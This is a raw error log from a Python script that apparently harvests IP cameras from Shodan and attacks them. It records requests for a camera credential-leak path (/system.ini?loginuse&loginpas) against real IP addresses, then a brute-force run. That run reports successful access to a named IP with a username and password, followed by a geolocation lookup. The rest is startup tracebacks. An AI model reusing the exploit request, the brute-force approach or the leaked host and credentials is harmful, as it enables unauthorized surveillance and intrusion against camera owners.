INFO:root:2023-04-10 01:28:49.512544: Program started.

INFO:root:[2023-04-10 01:28:58.800878]: Modules imported successfully.

INFO:root:[2023-04-10 01:28:58.934049]: Search operation started without arguments.

INFO:root:[2023-04-10 01:29:05.370309]: Received camera data from Shodan.

INFO:root:[2023-04-10 01:29:05.371283]: Camera sweeps have begun.

ERROR:root:[2023-04-10 01:29:09.337573]
Traceback (most recent call last):
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
    conn = connection.create_connection(
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
    raise err
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
    sock.connect(sa)
ConnectionRefusedError: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
    httplib_response = self._make_request(
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
    conn.request(method, url, **httplib_request_kw)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
    self._send_request(method, url, body, headers, encode_chunked)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
    self.endheaders(body, encode_chunked=encode_chunked)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
    self._send_output(message_body, encode_chunked=encode_chunked)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
    self.send(msg)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
    self.connect()
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
    conn = self._new_conn()
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 171, in _new_conn
    raise NewConnectionError(
urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x0000000803F7D6D0>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
    resp = conn.urlopen(
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
    retries = retries.increment(
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
    raise MaxRetryError(_pool, url, error or ResponseError(cause))
urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='124.71.229.199', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000000803F7D6D0>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение'))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "C:\Users\maxtyson\Desktop\fin.py", line 401, in st
    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
    return session.request(method=method, url=url, **kwargs)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
    resp = self.send(prep, **send_kwargs)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
    r = adapter.send(request, **kwargs)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 516, in send
    raise ConnectionError(e, request=request)
requests.exceptions.ConnectionError: HTTPConnectionPool(host='124.71.229.199', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000000803F7D6D0>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение'))

ERROR:root:[2023-04-10 01:29:32.268955]
Traceback (most recent call last):
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
    six.raise_from(e, None)
  File "<string>", line 3, in raise_from
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
    httplib_response = conn.getresponse()
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
    response.begin()
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
    version, status, reason = self._read_status()
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
    return self._sock.recv_into(b)
socket.timeout: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
    resp = conn.urlopen(
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
    retries = retries.increment(
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
    raise six.reraise(type(error), error, _stacktrace)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
    raise value
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
    httplib_response = self._make_request(
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
    raise ReadTimeoutError(
urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='120.77.99.72', port=81): Read timed out. (read timeout=10)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "C:\Users\maxtyson\Desktop\fin.py", line 401, in st
    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
    return session.request(method=method, url=url, **kwargs)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
    resp = self.send(prep, **send_kwargs)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
    r = adapter.send(request, **kwargs)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
    raise ReadTimeout(e, request=request)
requests.exceptions.ReadTimeout: HTTPConnectionPool(host='120.77.99.72', port=81): Read timed out. (read timeout=10)

INFO:root:[2023-04-10 01:30:14.421582]: Bruteforce started.

INFO:root:[2023-04-10 01:30:27.625311]: Accessed: 79.49.52.9 ('user', 'daniele')

INFO:geocoder.base:Requested http://ipinfo.io/79.49.52.9/json
INFO:root:[2023-04-10 01:30:28.535324]: Shutdown

INFO:root:2023-04-10 01:36:04.640742: Program started.

ERROR:root:[2023-04-10 01:36:22.969367]
Traceback (most recent call last):
  File "C:\Users\maxtyson\Desktop\fin.py", line 43, in <module>
    current_date_str = response.json()['currentDateTime']
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\models.py", line 897, in json
    return complexjson.loads(self.text, **kwargs)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\__init__.py", line 357, in loads
    return _default_decoder.decode(s)
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\decoder.py", line 337, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\decoder.py", line 355, in raw_decode
    raise JSONDecodeError("Expecting value", s, err.value) from None
json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)

INFO:root:2023-04-10 01:37:40.274061: Program started.

ERROR:root:[2023-04-10 01:37:56.563031]
Traceback (most recent call last):
  File "C:\Users\maxtyson\Desktop\fin.py", line 67, in <module>
    import configsarser
ModuleNotFoundError: No module named 'configsarser'

INFO:root:2023-04-10 01:38:00.953833: Program started.

ERROR:root:[2023-04-10 01:38:17.488018]
Traceback (most recent call last):
  File "C:\Users\maxtyson\Desktop\fin.py", line 67, in <module>
    import configsarser
ModuleNotFoundError: No module named 'configsarser'

INFO:root:2023-04-10 01:38:49.235259: Program started.

ERROR:root:[2023-04-10 01:39:05.154428]
Traceback (most recent call last):
  File "C:\Users\maxtyson\Desktop\fin.py", line 67, in <module>
    import configsarser
ModuleNotFoundError: No module named 'configsarser'

INFO:root:2023-04-10 01:39:13.424888: Program started.

ERROR:root:[2023-04-10 01:39:28.766097]
Traceback (most recent call last):
  File "C:\Users\maxtyson\Desktop\fin.py", line 67, in <module>
    import configsarser
ModuleNotFoundError: No module named 'configsarser'

